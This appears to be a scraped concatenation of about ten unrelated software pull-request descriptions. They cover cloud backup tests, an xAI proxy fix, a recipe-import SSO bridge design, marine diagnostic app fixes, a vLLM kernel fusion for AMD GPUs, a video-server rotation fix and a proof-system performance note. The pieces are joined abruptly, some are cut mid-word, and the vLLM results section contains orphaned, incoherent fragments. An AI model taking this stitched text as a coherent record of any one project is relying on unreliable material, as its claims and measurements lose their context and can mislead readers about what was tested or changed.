**מסלול R2 מול S3 מדומה — 18 בדיקות, כולן עברו.** העלאה (key, Content-Type, זהות הבייטים למקור), רוטציה לפי `LastModified`, ואימות שהיא **לא** מוחקת קובץ זר תחת אותו prefix ולא קובץ מחוץ ל-prefix. `retention=0` מכבה רוטציה. באקט ריק ⇒ הדגל כבוי. `prefix` ריק ⇒ שורש הבאקט. גיבוי עובד בלי `R2_PUBLIC_URL`, בעוד העלאת קובץ מצורף עדיין נחסמת בלעדיו.

**גיבוי מקצה לקצה מול Mongo בזיכרון — 29 בדיקות, כולן עברו.** ה-zip נכתב, הועלה, והעותק ב-R2 זהה בייט-לבייט למקומי; `ObjectId` ו-`datetime` שורדים את סבב Extended JSON; לא נשארו קבצי `.partial`. כשל מדומה בהעלאה משאיר `success=True` עם `r2_error` מדווח. author: nicholmahania-spec
body:
Two proxy bugs found by driving the live Helper. Both were invisible to the test suite, which exercises `handleXaiProxy` with a body already supplied — the adapter's own body reading was never covered.

## The body was never read

`api/xai/chat/completions.js` handled two shapes: a string body, and an object the platform had already parsed. There is a **third** — Vercel does not always apply its parser, and then `req.body` is `undefined` while the bytes sit unread on the stream.

The handler treated that as an empty body, so every Helper request arrived with no messages and came back **400**. From the browser that looks like the client sent rubbish; it had simply never been read.

`readBody()` now drains the stream when the platform hasn't parsed it.

## An upstream rejection looked like a fault in this proxy

The handler forwards xAI's status verbatim, so an xAI error reaches the browser as a bare number with no reason attached. A wrong model name and a wrong API key are the same opaque 400 from outside, and there is nowhere else the real message survives.

It now logs the upstream status, model, and response body server-side.

That is what identified the live failure:

```
xAI upstream 400 for model "grok-4.5":
{"code":"invalid-argument","error":"Incorrect API key provided."}
```

**xAI returns 400 for a bad credential, not the 401 the convention suggests.** Without this line that is indistinguishable from a malformed request, and a lot of time went into treating a credential problem as a request problem.

Nothing user-facing changes — the `console.error` is server-side only.

## Verification

- `npm test` — 604 tests, green
- `npm run build` — green
- Both fixes confirmed against the live deployment via Vercel runtime logs

body:
# Stage 12B — Kindred recipe delivery grants

Status: draft, unmerged, undeployed. The bridge is disabled unless every server-side production gate is explicitly configured. Verification used synthetic records, fake destinations, local built applications, and disposable databases only.

## Provenance and readiness

| Surface | Commit | Evidence | Authority |
| --- | --- | --- | --- |
| Kindred `main` and production | `f1c52bad3bbb23985743162f43279f0fbbdfa332` | GitHub Vercel deployment `5701024855` and Railway deployment `5701021939` report success | authoritative |
| Legacy Table PR 41 merge and `main` | `2cb49ea61c1de95ea336f4e6e9f6ce0c7c5d474e` | PR 41 merge metadata and current `main` | authoritative |
| Legacy Table production | `2cb49ea61c1de95ea336f4e6e9f6ce0c7c5d474e` | GitHub Vercel deployment `5701273770` and Railway deployment `5701271131` report success | authoritative |
| Old Legacy Table split repositories | old March 2026 commits | deployments `4111888366` and `4111888367` are inactive `new_root` deployments | non-authoritative |

Authenticated Railway variable and database-index metadata were not available through this task connection. `RECIPE_IMPORT_HASH_KEY`, transaction topology, and production import-index readiness therefore remain unverified activation blockers. No value, database document, customer record, or production log was accessed.

## End-to-end trust boundary

```mermaid
sequenceDiagram
  participant K as Kindred browser
  participant KA as Kindred API
  participant LA as Legacy Table API
  participant L as Legacy Table browser document
  participant DB as Legacy Table transaction
  K->>KA: Author preview and explicit consent
  KA->>KA: Persist one author/source/revision operation
  KA->>LA: Mint single-use SSO code server-to-server
  KA-->>K: /sso?code=...#transfer=...
  K->>L: Initial navigation
  L->>L: Pre-React capture; history.replaceState('/sso')
  L->>LA: Redeem SSO code
  LA-->>L: Legacy Table session
  L->>KA: POST payload with X-Kindred-Transfer; no cookies
  KA-->>L: Exact immutable Stage 12A payload
  L->>L: Explicit existing/create cookbook choice
  L->>LA: Reconcile original operation, then POST if absent
  LA->>DB: Transactional recipe, receipt, and operation
  DB-->>L: Opaque receipt and safe category
  L->>KA: Header-only acknowledgement
  KA->>KA: Transactional monotonic completion
```

Kindred never receives a Legacy Table session or destination user/family identifier. Legacy Table never accepts a destination identity from Kindred; its own Bearer session is the only ownership authority.

## Durable bindings and state

One unique database row binds the keyed author binding and keyed source-subject binding to one random operation ID, one random opaque source reference, the immutable revision digest, `kindred_recipe_import_v1`, audience `legacy_table`, purpose `recipe_import`, and exact origin `https://legacytable.app`. The raw transfer credential is returned once; only its SHA-256 digest is stored. New grants replace the digest while preserving the operation.

| Current state | Allowed transition | Guard |
| --- | --- | --- |
| `previewed` | `consented` | explicit checkbox remains unchecked by default |
| none | `consented` | unique author/source transaction |
| `consented` | `grant_ready` | complete config, author ownership, index readiness, SSO acceptance, revision CAS |
| `grant_ready` | `payload_retrieved` | valid header grant, exact origin/audience/purpose/expiry |
| `payload_retrieved` | same state with a replacement grant | stable operation; no backwards transition |
| `payload_retrieved` / `destination_pending` | `completed` | destination accepted/already accepted, same revision, opaque receipt, transaction |
| non-completed | `conflict` | changed source, divergent receipt/revision, destination conflict/deletion |
| non-completed | `revoked` | explicit browser abandonment |
| active grant | expired grant category | digest removed; operation remains recoverable with its original ID |
| `completed` | `completed` only | identical receipt retry; divergent receipt fails closed |

## Credential and transport matrix

| Value | Initial transport | Later transport | Storage |
| --- | --- | --- | --- |
| Legacy SSO code | unavoidable `/sso?code=...` query | SSO redemption body only | digest-only, short-lived, single-use |
| Kindred transfer credential | URL fragment only | `X-Kindred-Transfer` only | digest-only in Kindred; transient browser memory |
| Legacy Table session | Legacy SSO response | `Authorization: Bearer` to Legacy Table only | existing Legacy Table session storage |
| Recipe payload | none in navigation | Kindred response and Legacy Table POST body | normal source/destination recipe records only |
| Operation ID | API body; Legacy reconciliation path | bodies and safe reports | both operation records |

Payload, acknowledgement, and revocation responses are `no-store` and `no-referrer`. The browser uses `credentials: omit`, rejects redirects, and never sends the Legacy session to Kindred.

## Authorization and ownership

| Actor | Preview | Create/resume grant | Retrieve | Import | Acknowledge |
| --- | --- | --- | --- | --- | --- |
| exact Kindred recipe author | yes | yes with explicit consent | only through grant | only as authenticated Legacy user | through same grant |
| Kindred organizer who is not author | no | no | no | no special authority | no |
| another community/account | indistinguishable not found | no | no | destination owner isolation | no |
| anonymous caller | no | no | valid purpose-bound grant only | no | valid grant only |
| Legacy administrator/keeper | no ownership bypass | no | no | normal authenticated family rules only | no |

Hidden, deleted, withdrawn, non-recipe, missing, changed-revision, wrong-origin, wrong-audience, malformed, expired, revoked, and unknown cases fail closed.

## Failure, retry, and reconciliation

| Failure | Safe behavior |
| --- | --- |
| configuration, URL, key, or index preflight | no operation, grant, provider call, or recipe mutation |
| destination SSO provider preflight | no operation, source link, grant, or recipe mutation; any unreturned one-time SSO code simply expires |
| crash after operation creation | original operation recovered by keyed author/source binding |
| concurrent start | one operation and one CAS grant winner; losing navigation fails closed |
| browser crash after grant | new grant reuses the original operation ID |
| timeout before destination acceptance | reconcile original ID; POST identical payload only when absent |
| timeout after acceptance / lost response | reconciliation recovers the existing opaque receipt |
| lost Kindred acknowledgement | a replacement grant retrieves the same operation and acknowledges the recovered receipt |
| different operation for the same source | Legacy Table source-subject uniqueness converges to the original receipt |
| divergent payload or revision | conflict; no source or destination overwrite |
| destination deletion | safe deleted/conflict state; tombstone prevents recreation |
| transient unavailable acknowledgement | does not replace completion or destroy recovery state |

## Logging, analytics, retention, and deletion

Neither application logs or reports identity, content, source references, revision digests, credentials, sessions, headers, request/response bodies, family/user/recipe identifiers, provider payloads, or credential-bearing URLs. Safe output is limited to opaque operation/receipt references and categorical status/error codes. The Legacy Table `/sso` document suppresses CookieYes, Google tags, PostHog initialization, identify/reset/capture calls, replay, and service-worker registration for its entire lifetime.

Transfer credentials expire after 10 minutes. Kindred operations expire after 400 days. Legacy Table operations and replay tombstones follow the Stage 12A 400-day/replay-retention contract. Source and destination copies retain independent deletion c

body:
Second batch from the six-dimension code review (first batch: #1). These are the medium-severity correctness fixes.

## Changes

### Diagnostic data
- **Dead-end node fixed:** `oh_passage_block` in the overheat tree was an `instruction` node with no exits, and its actual repair guidance (`action`/`estimatedTime`) lived in fields only resolutions render — a tech following "passages may be blocked" hit a screen with just a Back button. It's now a `resolution` and the descale-flush instructions display.
- **Orphaned tree wired up:** the fully-built 63-node `yamaha_flash_codes` tree had no menu card and was unreachable. Added a card under Engine. A graph validation script now passes clean: 13 trees, 13 cards, every node reachable, zero non-resolution dead ends.
- **Yamaha code-series disambiguation:** `YAM-nn` (YDS/Command Link) and `YAM-F-nn` (on-engine flash codes) are different numbering schemes where the same number means different things (code 19 = TPS in one, battery voltage in the other). Both series headers now say so explicitly so the AI grounding can disambiguate "Yamaha code 19". Also unified `Oil` → `Lubrication` system labels and replaced two empty `parts` fields with an explicit "None — informational" sentinel.

### Server
- **PWA manifest public:** browsers fetch `<link rel="manifest">` without credentials, so `/manifest.json` behind `requireAuth` 302'd to `/login` and the app was uninstallable for everyone. Now served publicly (it contains nothing sensitive).
- **Auth limiters split per endpoint** with `skipSuccessfulRequests: true` — signup, login, and admin-code no longer share one 5/15min counter, so a few techs signing in from shared marina Wi-Fi can't lock out the next one.
- **Async bcrypt:** `bcryptjs` sync at cost 12 blocked the whole event loop ~300ms per login/signup; handlers now use the promise API.
- **`/api/ask` hardening:** explicit 60s timeout + 1 retry (SDK default allowed ~30min worst case holding a phone connection); upstream 429/529 now returns 429 ("AI is busy") and 401/403 returns 503 ("misconfigured") instead of a blanket 500; client-supplied `context.tree`/`context.node` bounded to 120 chars (was an unbounded prompt-injection/token channel, also stored unsliced in SQLite); prompt-cache TTL raised to 1h to match bursty field usage.
- **Denied-user redirect loop fixed:** `/login` destroys a denied session and renders instead of bouncing `/login` → `/login?error=denied` forever.

### Metrics
- Admin dashboard login counts now match `login_ok%`, so Google SSO (`login_ok_google`) and break-glass logins are counted — previously the core adoption metric read ~zero for a Google-SSO org.

### Widgets
- **Voice input can be cancelled:** tapping the mic while listening now `abort()`s instead of finalizing-and-submitting; recognition errors and pre-existing typed drafts never auto-submit.
- **Honest error messages:** ask/feedback fetch handlers branch on HTTP status — 429s and expired sessions no longer show as "Network error"; Enter can't stack concurrent `/api/ask` requests while one is in flight.

### Docs
- CLAUDE.md updated to match the codebase (10 HTML pages, 4 data files, 13 trees, feedback/beacon/health routes, Google-only admin bootstrap).

## Verification
- `node --check` on all edited files.
- Tree-graph validator: all references resolve, all nodes reachable, no dead ends, menu cards ↔ trees 1:1.
- Fault-code page smoke test still passes against the real 44-entry database.
- Live server: `/manifest.json` 200 unauthenticated; signup/login work through the async bcrypt path (wrong password 401); denied user on `/login` gets 200 with zero redirects; `getSummary()` counts all three login kinds.

body:
Work-item 081KYWE8Q3508 — with schema-on-ZSets, *"our entire db stored-proc architecture long term."*

**Finding that shaped it:** the design doc carries **two** open generics and one was already landed — the *weight* axis lives in `ZSetW.fs`'s `*By` ops, so re-landing it would have been duplicate work. The un-landed axis (and the one the work-item names) is the **element/row** type, where §4's **path 1, dictionary-passing (Wadler–Blott 1989)** is the *correct* mechanism, not the demoted fallback.

- **Type-tagged key** `(TypeId, Canon)` — heterogeneous `ZSet<ZAtom>`, no boxed `obj`, and **no registry lookup in the compare path** (a mutable global there would make sort order depend on *registration order* — capture + a DST hazard). Comparison is `Collation.binary`, not F#'s structural default (UTF-16 code units diverge on astral planes).
- **Two genuinely different impls**: int64's canon is **order-preserving** (codepoint order *is* numeric order — the collation treaty discharged by the encoding); string's `double` is concatenation — *the same abstract x⊕x in a different monoid*. `succ` is absent from string so operator-not-supported has a real instance.
- **`mapValues` is all-or-nothing** — a partial result would be a silent drop wearing an `Ok`, the same landmine class as the `Meno.Bind` bug.

**29 tests** incl. a regression guard that *an unregistered row hidden among succeeding rows still fails the call* — the exact shape a `choose` would swallow. Z-linearity (incl. w<0 and emit-then-retract), determinism/DST, canon injectivity. Composes with `SchemaLog` via a **fold**-tracked coverage check.

body:
Closes the hole left by #170, and corrects a claim I made about it.

## The correction

I said arming only fires when someone opens the Members sheet on the founding phone. **That was wrong.** `space:revocationStatus` runs from `loadMembers`, which is on the general refresh - on open, on every change, on reconnect, and a 15s backstop. A space the owner is *looking at* arms within seconds, which is what was watched working on hardware tonight.

## The hole that actually remains

Narrower, but worth closing. That refresh only ever runs for the **active** space, and only the owner **device** can perform the first arming (`canActAsOwner` needs `revokeV2`, so a linked phone cannot reach it).

So a space its founder creates and never opens again **never arms**, and the founder's other phone can never manage it. That is the exact "my second phone has no buttons" complaint, on a space nobody thinks to revisit. It self-heals the moment the founder opens it - which is what would make it an intermittent report rather than a clean bug.

## Why publishing is the right trigger

It is the moment the precondition becomes true. `allMembersSupportCap` returns **false on an empty row set**, so arming any earlier is a silent no-op that nothing retries.

`armAfterPublish` updates the base first - our own append has to be *applied* before the gate can see the row - then defers to `armRevocation`, which re-checks ownership, arming state and the capabilities itself. So this can only ever be early, never wrong.

## Verification

- **415 tests pass** (414 before).
- **Non-vacuous**: commenting out the call makes the new test fail.
- The new test never calls `space:revocationStatus`, so it cannot pass by way of the path that already worked.

body:
# Stage 12B — secure Kindred recipe import landing

Status: draft, unmerged, undeployed. This is the browser half of the coordinated Stage 12B bridge. The authoritative destination idempotency contract remains `docs/STAGE_12A_LEGACY_TABLE_RECIPE_IMPORT.md` and `docs/KINDRED_RECIPE_IMPORT_COMPATIBILITY.md`.

## Browser boundary

The `/sso` HTML bootstrap captures the existing SSO query code and the separate `#transfer=` credential before React or any third-party initialization, stores them only as non-enumerable transient window properties, and immediately replaces history with clean `/sso`. React deletes both properties before use. CookieYes, Google tags, PostHog initialization/identity/reset/capture, replay/autocapture, and service-worker registration remain suppressed for the entire sensitive document.

After SSO redemption, the page keeps the Legacy Table session within Legacy Table. It retrieves the Kindred payload with `X-Kindred-Transfer`, `credentials: omit`, `redirect: error`, `cache: no-store`, and `referrerPolicy: no-referrer`. It reconciles the original operation ID before any destination POST, requires an explicit family/cookbook choice, submits through the authenticated Stage 12A endpoint, and acknowledges the opaque result to Kindred with the grant header.

## Destination state and choices

| Observation | Browser action | Destination guarantee |
| --- | --- | --- |
| no eligible family | neutral name plus unchecked create confirmation | family and recipe share one transaction |
| one eligible family | unchecked existing-family confirmation | server revalidates current family |
| stale or multiple family state | stop on categorical conflict | zero mutation |
| existing operation accepted | acknowledge recovered receipt | no POST and no duplicate |
| operation absent | one POST with exact original payload | Stage 12A transaction/uniqueness |
| ambiguous POST response | reconcile same operation | never mint a replacement ID |
| deleted receipt | show safe deleted category | tombstone prevents recreation |
| explicit abandonment | best-effort header-only revocation, clear transient state | no recipe creation |
| terminal deletion/conflict acknowledgement | immediately discard the grant from React state | safe category only; no retry with retained credential |

## Privacy and reporting matrix

| Surface | Allowed | Prohibited |
| --- | --- | --- |
| URL/history/referrer | clean `/sso`; opaque operation in destination reconciliation path | grant, content, source reference, revision, session |
| browser persistence | existing Legacy session | SSO code, transfer grant, recipe payload, source binding |
| Kindred requests | transfer header and exact payload/ack bodies | Legacy session/cookies/redirects |
| Legacy requests | Legacy Bearer session and Stage 12A body | grant in path/query/body; Kindred identity assertion |
| UI/report | selected recipe, safe categories, opaque operation/receipt | names, emails, user/family/recipe IDs, provider payloads |
| analytics/tracing/logs | none for the sensitive document | identity, content, credentials, headers, bodies, URLs |

## Retry, retention, deletion, and rollback

Reloading after the bootstrap intentionally loses the transfer credential; the author resumes from Kindred, which issues a new short-lived grant for the same operation. A response loss is reconciled before another POST. An accepted destination receipt is immutable; a deleted destination copy remains tombstoned. Legacy Table and Kindred copies have independent deletion controls.

Rollout order: confirm `RECIPE_IMPORT_HASH_KEY`, transaction topology, and indexes; deploy this destination first; deploy Kindred with delivery disabled; verify commits; configure the exact Kindred API origin; run a synthetic smoke plan; enable Kindred last. Rollback disables Kindred issuance first and preserves destination reconciliation records.

Required configuration names, without values: `RECIPE_IMPORT_HASH_KEY`, `REACT_APP_KINDRED_API_ORIGIN`, `REACT_APP_BACKEND_URL`, `MONGO_URL`, `DB_NAME`, `JWT_SECRET`, `UBUNTU_SSO_SECRET`, and `CORS_ORIGINS`.

## Verification evidence and remaining gate

- Stage 12A backend contract, transactional import, family, deletion, SSO, and HTTP tests: 34 passed with a disposable replica set.
- Frontend unit/static: 6 passed after the final analytics, bounded-timeout, and credential-lifecycle guards.
- Production build and five-route prerender: passed.
- Built normal SSO isolation: passed.
- Built Kindred import flow: passed against the real built application with synthetic SSO, header-only Kindred retrieval, destination reconciliation/acceptance, acknowledgement, zero credential persistence, and all third-party executable/telemetry requests blocked. A clean production build was recreated afterward with the production Kindred origin default.
- OpenAPI, Python compilation, Black 26.1.0, `git diff --check`, credential/logging/provider/analytics/generated-artifact scans, and repository asset-isolation checks passed.

Production key/index/transaction readiness remains unverified because authenticated Railway metadata was unavailable in this task. No production configuration was read or changed. Delivery remains disabled pending both coordinated merges, deployments, provenance verification, and separately authorized activation.

The dependency scan retains the existing broader Legacy Table baseline of 3 low, 10 moderate, and 24 high advisories. This browser bridge adds no dependency or lockfile update; broader dependency remediation remains a separately tracked limitation.

author: cagdaserturk
body:
`render` took the clear colour and the pipeline **positionally**, in three mirrored implementations across two crates, with no way to add a frame-level parameter without breaking every caller. Several are already known to be coming — an in-flight policy, a load operation, a viewport, a colour-space override — and each would have broken the same forty-odd sites again.

It now takes one `#[non_exhaustive]` descriptor, built through `RenderDesc::new(clear)` with a `pipeline` builder. **This is intended to be the last breaking change to that signature**: every future frame-level parameter is a builder method touching no existing caller.

### One descriptor for both targets, not one each

`RenderPipeline` already crosses both targets carrying a field only one of them can satisfy, and each target refuses a mismatch with its own `debug_assert!` beside its device check. So "one descriptor, target-specific fields validated at the target" is not a pattern being invented here — it is the one this crate already uses for its closest analogue. Splitting it would leave two conventions for one question.

### Three smaller decisions worth flagging

**`Debug` is hand-written.** `RenderPipeline` has none, and a driver handle's address is not information, so the descriptor reports *whether* a pipeline is bound rather than which.

**Callers holding an optional pipeline expand to an explicit conditional** rather than the builder accepting an `Option`. That shape is an artifact of lazy initialisation in tests and samples; a renderer holds a pipeline, and shaping the API around the other case would optimise for the wrong consumer.

**Not `Default`, same reasoning as the pipeline descriptor** — a frame with no clear colour is not a partially-configured frame.

### Migration

41 call sites migrated mechanically (two regular shapes), 5 by hand (the `Option`-holding ones). An unrelated no-arg `render()` on the JSON emitter was correctly left alone.

### Verification

Literal construction from outside the crate is rejected: `error[E0639]: cannot create non-exhaustive struct using struct expression`. Without that check the attribute is decoration. fmt clean, clippy clean under `-D warnings`, 81 suites green.

## Purpose

Fuse the Kimi-K3 AMD latent-MoE output boundary and optionally store its
up-projection weight in row-scaled OCP E4M3:

- expose one MoE-runner hook for the routed-output transform plus shared add;
- use the AITER BF16 fused tail only for its exact supported contract; and
- with `VLLM_ROCM_USE_KIMI_K3_LATENT_TAIL_FP8=1`, prepack the local tail weight
  after loading and select the AITER FP8 variant.

The hook defaults to the previous operation order. Packed tensors are
nonpersistent buffers; no allocation or quantization occurs during graph
capture. Missing kernels and unsupported devices, shapes, dtypes, or layouts
use the existing path. NVIDIA is unchanged.

Depends on ROCm/aiter#4496 (BF16) and ROCm/aiter#4503 (FP8). The former child
#50663 was folded into this ownership parent.

## Test plan

Tested on 8x MI355X (`gfx950`) with the public Kimi-K3 image and
`moonshotai/Kimi-K3@9f62e4e9`. Kernel heads: AITER #4496 `ae0e0e12` and #4503
`a9f06c1f`; the command below pins the vLLM base and PR revisions.

Fetch and verify the vLLM source:

```bash
git clone https://github.com/vllm-project/vllm.git vllm
git -C vllm fetch origin refs/pull/50657/head:pr-50657
test "$(git -C vllm rev-parse pr-50657)" = \
  1e3156f2f429400cc07b2696f1cf4d4dd1afdad4
git -C vllm checkout --detach 6c91de36897932ba9b5adb11992235a2a789e009
git -C vllm diff 62195e9784ebec1ece42b88a861734e0702cc2d5..pr-50657 \
  --binary | git -C vllm apply -
git -C vllm diff --check
```

Use complete verified vLLM/AITER trees as overlays on the public image,
including AITER `csrc/` and `hsa/`; do not copy individual files. Verify
`import vllm, vllm._C, aiter` before testing.

```bash
python -m pytest -q \
  ../aiter/op_tests/flydsl_tests/test_latent_moe_tail.py \
  ../aiter/op_tests/flydsl_tests/test_latent_moe_tail_fp8.py \
  tests/models/kimi_k3/test_amd_latent_moe_tail.py \
  tests/models/kimi_k3/test_amd_latent_moe_tail_fp8.py
```

Serve `parent`, `bf16`, and `candidate` arms; enable the FP8 variable only for
the candidate:

```bash
VLLM_ROCM_USE_AITER=1 VLLM_ROCM_USE_AITER_FP4BMM=1 \
AITER_SITUV2_A8W4=1 AITER_BF16_FP8_MOE_BOUND=0 \
VLLM_ROCM_USE_KIMI_K3_LATENT_TAIL_FP8=1 \
vllm serve /model --served-model-name moonshotai/Kimi-K3 \
  --tensor-parallel-size 8 --trust-remote-code --moe-backend auto \
  --gpu-memory-utilization 0.95 --max-num-seqs 128 \
  --max-num-batched-tokens 4096 --max-model-len 1048576 \
  --enable-prefix-caching --kv-cache-dtype fp8 --reasoning-parser kimi_k3
```

After one 8K/128 warmup, run three 8K/1K batch-one trials with seeds 1--3,
temperature zero, and `--ignore-eos`. Run full `lm-eval==0.4.12` GSM8K on
parent and candidate: 1,319 questions, 5-shot, greedy completion, 2,048
generated tokens, concurrency 128, and seed 42.

## Test results

- Combined focused suite: **19/19 passed**.
- Changed-file pre-commit, `git diff --check`, and DCO passed.

| MI355X microbenchmark | Control | Candidate | Speedup |
| --- | ---: | ---: | ---: |
| BF16 fused tail | 13.6019 us | 9.9237 us | **1.3706x** |
| FP8 fused tail | 13.7860 us | 7.1394 us | **1.9310x** |

| TP8 8K/1K median | Control | Candidate | Change |
| --- | ---: | ---: | ---: |
| BF16 fusion | 35.8923 tok/s/GPU | 36.9206 tok/s/GPU | **+2.865%** |
| Optional FP8 increment | 37.1627 tok/s/GPU | 37.3209 tok/s/GPU | **+0.426%** |

further 0.1140 ms/token.

transport failures; 11 wins/13 losses (`p=0.8388`). This paired run found no
statistically detectable accuracy difference.

The 35.8923-to-36.9206 BF16 pair used the earlier frozen vLLM base

current source contract above. The two endpoint eras are not combined into one
absolute-stack claim.

author: kaeawc
body:
## Summary

Fixes the capture-path half of [#4785](https://github.com/kaeawc/auto-mobile/issues/4785): the video server computed output dimensions once in `main()` and never reacted to rotation, so the `VirtualDisplay` and encoder surface stayed at the startup orientation. A mid-stream rotation therefore left mirrored content squished/letterboxed for the rest of the session. This is purely the visual-distortion fix — **no wire-protocol change** (the protocol/attestation half is [#4786](https://github.com/kaeawc/auto-mobile/issues/4786), out of scope here).

## Rotation detection (listener + poll fallback)

New `RotationMonitor` (interface + fake seam) funnels two mechanisms through a single coalescing `poll()`:

- **Primary:** a `DisplayManager.DisplayListener` (`onDisplayChanged`) registered via `DisplayControl.registerDisplayListener`, which returns an unregister lambda or `null` when registration is unavailable.
- **Fallback:** a poll thread over `DisplayControl.getDisplayInfo().rotation`, always running because under `app_process`/shell uid the framework listener may never register or fire. `poll()` is a pure, synchronized change detector, so a listener callback and a poll tick that observe the same rotation collapse to one dispatch.

The monitor only flags `rotationPending`; the actual swap runs on the encode-loop thread, which owns the encoder/capture lifecycle exclusively, so it never races concurrent `MediaCodec` access.

## Atomic-swap design

On a flagged rotation the encode loop re-reads the display, recomputes output dimensions with the **same preset scaling used at startup**, and returns early when the size is unchanged. On a real change it:

1. Calls `VideoStreamWriter.resetReplayCacheForResize()` — which clears the replay cache **under the writer's own `lock`**, the same lock that guards client attach/replay. This is the atomicity guarantee: a client attaching mid-swap serializes either fully before the reset (replays the old coherent config+IDR) or fully after it (replays nothing, then requests a keyframe), and can **never** observe the new encoder's SPS/PPS paired with the stale pre-rotation IDR.
2. Tears down the old `ScreenCapture`/`VirtualDisplay` and encoder.
3. Recreates both at the new dimensions. The new encoder's SPS/PPS + IDR flow to any attached client live and repopulate the replay cache for reconnecting clients (the writer cache self-heals, per the issue).

`FrameHeartbeat` and `VideoSessionLease` are untouched by the swap and keep running across it. Rotating back recomputes the original dimensions and swaps again; repeated rotations are handled.

## `--size` decision

An explicit `--size` override **pins WxH regardless of orientation** — the least-surprising behavior for an explicit request: the operator asked for a specific frame size, so rotation must not silently swap it. With `--size` set, a rotation resolves to the same size and no swap occurs (the mirror letterboxes within the pinned surface). Documented in `resolveOutputDimensions`.

## Test seams

- `RotationMonitorTest` — `poll()` change detection + coalescing, the listener-callback dispatch path, and the poll-fallback path when registration returns `null`. No real timers: the poll loop's sleep is injected, and threads are gated by `CountDownLatch`.
- `VideoServerRotationSwapTest` — preset scaling swaps W/H on portrait↔landscape; 0↔180 leaves size unchanged (no swap); `--size` pins across orientation; rotating back restores dims; the replay-cache reset clears decoder state.

End-to-end rotation on a device is manual/out-of-CI; the logic above is unit-covered.

## Validation

- `./gradlew :video-server:compileKotlin` — PASS
- `./gradlew :video-server:test` — PASS (includes the new rotation/swap tests)
- `./gradlew :video-server:detektMain :video-server:detektTest` — 0 violations
- ktfmt validator (`scripts/ktfmt/validate_ktfmt.sh`) — 0 diffs

Closes [#4785](https://github.com/kaeawc/auto-mobile/issues/4785).

# Four-hair basket on the welttowelt frontier: twentieth tree, same bit-exact mechanisms

## Summary

Four bit-exact mechanisms in the recursion's utilization and counted-work classes, bundled per the composition logic the frontier labs themselves use ("individually each is offset-sized; together they are not"):

1. **Parallel enforced-sum in `induce_sumcheck_poly_via_ntt`** — the serial per-query dot-product loop (`n_queries · row_len` GF(2^128) multiplies on one worker) becomes a parallel map with an XOR reduction above a 32-query threshold. This finishes a conversion the codebase already made for the DENSE sibling (`induce_sumcheck_poly` has used per-thread chunked partials since its own promotion); the NTT variant — which the `induce_sumcheck_poly_auto` dispatch sends the LARGEST call to — had been left behind.
2. **Order-preserving parallel query-row collection** — the six serial `queries.iter().map(|&q| row(q).to_vec()).collect()` sites in both recursive provers (L0 opens, per-level opens, final-level opens) become `par_iter` collects. Rayon's indexed parallel collect into `Vec` preserves order deterministically, and each row copy is independent of the challenger, so output is byte-identical; the hundreds of per-site row allocations also stop serializing on one worker between the grind and the induce.
3. **Uninit per-thread induce scratch** — the dense `induce_sumcheck_poly` zeroed a length-n `local_basis` per worker even though `evaluate_scaled_basis_inplace` provably writes every slot before any read (`basis[0] = alpha`, then each doubling level writes `[2^k, 2^{k+1})` from the already-written lower half). Now `alloc_uninit_f128_vec(n)` under the codebase's existing write-before-read contract.
4. **Zero-fill + RMW deletion in the dense induce's accumulate/reduce** — the same class as this very frontier's promoted tape entry ("delete 128 MiB zero-fill and one full-buffer RMW", +0.61%), applied at the induce's scale: (a) each worker's `accum_basis` drops its zero-init — the chunk's FIRST query now evaluates directly into it (`copy`-semantics ≡ zero-init + XOR-add, since x ⊕ 0 = x), deleting one length-n memset AND one full-buffer XOR pass per worker per call; (b) the cross-thread reduce seeds by MOVING the first non-empty partial instead of zero-filling `basis_poly` and XOR-adding everything into it — one more memset and one more full-buffer pass deleted; (c) empty chunks return an empty marker instead of allocating, filling, and uselessly adding a length-n zero vector. Zero-query calls preserve the original zeroed-output behavior exactly.

Base: promoted frontier `4a21cf928f67818780d9365f7aba94cdec0a3c18` (welttowelt's `7d94ee68`, 1,060,813.99 — a +0.04% margin, the thinnest promotion of the campaign), synced minutes after its promotion. Revert-audit before rebasing: the lookahead markers are present, so this account's surplus is exactly the four-hair basket below. This account's latest resolved draw (`828bcf14`) scored 1,056,266.24 — the FIFTEENTH consecutive personal best, −0.41% against its own bar. The four-mechanism patch has applied clean on twenty consecutive frontier trees (kevaundray's basket, pepyakin's two URM passes, shazow's sparse-induce rework — which touched these functions' own callers — anupsv's, zeeshan8281's, 0xernesto's, and this one); the composed tree passes all upstream tests (349 in the suite) and the cross-binary identity below. Prior draws of this basket, in draw order: `46dfc960` (876,030.30), `aa4eb6d0` (880,093.16), `9ecb915d` (879,007.29), `280fc573` (883,208.84), `e689ac7f` (881,900.67), `63dfb6fa` (881,860.68), `a32ba5c7` (884,160.59 — this account's highest verified sample; the band rises with every frontier tree it rides) — re-drawn per the one-draw-per-tree dedupe rule, with the mechanisms free for any account to absorb (this note is the provenance).

## Method context, honestly

This account's ledger drives the evidence discipline: five ranked mechanism submissions on 7/31 all landed below base (`cf36b6e2`, `56c20b19`, `cd07f8ad`, `4ce181ce` — witness/queue/traffic mechanisms, each with a published falsification), one promoted disclosed resample (`f61d267e`, 875,368.94), one rejected draw of the current tree (`e7c8df59`, 879,093.02), and prior submissions of mechanism 1 alone (`cb3f0398`, 878,618.09) and of mechanisms 1+2 (`e90c3b27`, 879,966.81) — both verified, both rejected below the tree's outlier bar, and notably monotone increasing across this account's four verified draws of this tree (878,618 → 879,093 → 879,966), consistent with the hairs being real at ranked scale. The transferable lesson: on a non-runner-matched M4 Pro, timing judgments do not transfer, but **structure does** — a textually serial loop is serial on every machine, and giving idle workers transcript-independent work with an order-insensitive (or order-preserved) reduction has no schedule for the runner to disagree with. That is the exact class of the current frontier's promoted Change 3 (ring-switch tails at 2.2-of-12 threads → parallel) and of the dense induce's earlier conversion.

The four verified same-tree samples now published (878,618 / 878,880 / 879,093 / 882,455) put this tree's median near 878.9k with the official frontier score ~0.4% above it; a mechanism submission from this seat therefore needs real edge AND a decent draw. Bundling both hairs maximizes the real edge available in this class; the rest is the runner's dice, disclosed as such.

## Measurements (per-component only, loaded-host e2e excluded per the corpus's law list)

- Mechanism 1, worker-binary A/B at the ranked shape (`blake3_proof` bench no longer compiles on this frontier — its `#[global_allocator]` collides with the tree's `recycle_alloc`; profilers take note), same seed, LIG_PROVE_TRACE scored-prove bracket, alternating: `induce_sumcheck_poly` 2.99 / 4.65 ms serial → 2.87 / 2.56 ms parallel. Best-vs-best −0.43 ms; the serial 4.65 ms sample also shows the single-worker jitter exposure the parallel form trims — relevant on a median-of-100 scored metric (the NT-store precedent: variance elimination is worth as much as mean reduction).
